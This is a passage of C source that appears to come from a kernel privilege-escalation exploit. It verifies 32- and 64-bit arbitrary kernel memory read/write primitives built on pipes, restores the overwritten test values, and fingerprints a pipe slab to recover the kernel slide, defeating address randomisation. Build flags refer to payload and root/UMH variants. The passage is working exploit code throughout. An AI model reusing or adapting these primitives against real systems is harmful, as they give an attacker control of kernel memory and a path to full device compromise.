  pr_info("phys step read64 done ok=%d value=%016zx\n",
          physrw_read64_ok, physrw_read64_before);
  physrw_write64_value = next64;
  physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
  if (kernel_read_data(fd, proof64_addr, &physrw_read64_after,
                       sizeof(physrw_read64_after)) !=
      (ssize_t)sizeof(physrw_read64_after)) {
    goto cleanup;
  }
  physrw_write64_ok = physrw_write64_ok && physrw_read64_after == physrw_write64_value;

cleanup:
  if (proof64_saved) {
    kernel_write_data(fd, proof64_addr, &saved_proof64, sizeof(saved_proof64));
    kernel_read_data(fd, proof64_addr, &restored_proof64, sizeof(restored_proof64));
  }
  if (proof_saved) {
    kernel_write_data(fd, proof_addr, saved_proof, sizeof(saved_proof));
    kernel_read_data(fd, proof_addr, restored_proof, sizeof(restored_proof));
  }

  ok = physrw_read_ok && physrw_write_ok && physrw_read64_ok && physrw_write64_ok;
  pr_info("phys step done ok=%d read=%d write=%d read64=%d write64=%d\n",
          ok, physrw_read_ok, physrw_write_ok,
          physrw_read64_ok, physrw_write64_ok);
  return ok;
}

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static uintptr_t scan_p0_pipe_oracle(int fd, uintptr_t base) {
  const struct p0_fingerprint *fps = p0_fingerprints;
  int best_score = 0;
  int second_score = 0;
  int best_index = -1;
  unsigned char slab[ORDER3_SIZE];
  if (!read_pipe_slab(fd, base, slab)) {
    return (uintptr_t)-1;
  }
  for (int slide_index = 0;
         slide_index < P0_FINGERPRINT_SLIDE_COUNT; slide_index++) {
    const struct p0_fingerprint *fp = &fps[slide_index];
    int score = 0;
    for (int w = 0; w < P0_FINGERPRINT_WORDS; w++) {
      size_t off = fp->offsets[w];
      uint64_t val = 0;
      if (off + 8 <= ORDER3_SIZE) {
        memcpy(&val, slab + off, 8);
      }
      if (val == fp->values[w]) {
        score++;
      }
    }
    if (score > best_score) {
      second_score = best_score;
      best_score = score;
      best_index = slide_index;
    } else if (score > second_score) {
      second_score = score;
    }
  }
  if (best_score < P0_FINGERPRINT_MIN_SCORE) {
    return (uintptr_t)-1;
  }
  if (second_score >= P0_FINGERPRINT_MIN_SCORE) {
    return (uintptr_t)-1;
  }
  return fps[best_index].slide;
}
#endif

/*
 * run_p0_pipe_oracle_diagnostic — diagnostic wrapper around
 * scan_p0_pipe_oracle.  Defined only in non-app (root/UMH) builds
 * because slide_app.c provides its own version for -app.so builds,
 * and having both translation units define the symbol causes a
 * duplicate-symbol link error when -DAPP_PAYLOAD=1 -DSLIDE_STACK_WRITER=1
 * pulls in both pipe.c and slide_app.c.
 */
#if !(defined(APP_PAYLOAD) && APP_PAYLOAD)
void run_p0_pipe_oracle_diagnostic(int fd, uintptr_t base) {
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  uintptr_t slide = scan_p0_pipe_oracle(fd, base);
  pr_info("p0_pipe_oracle diagnostic base=%016zx slide=%016zx\n",
          base, slide);
#else
  (void)fd;
  (void)base;
#endif
}
#endif /* !(defined(APP_PAYLOAD) && APP_PAYLOAD) */
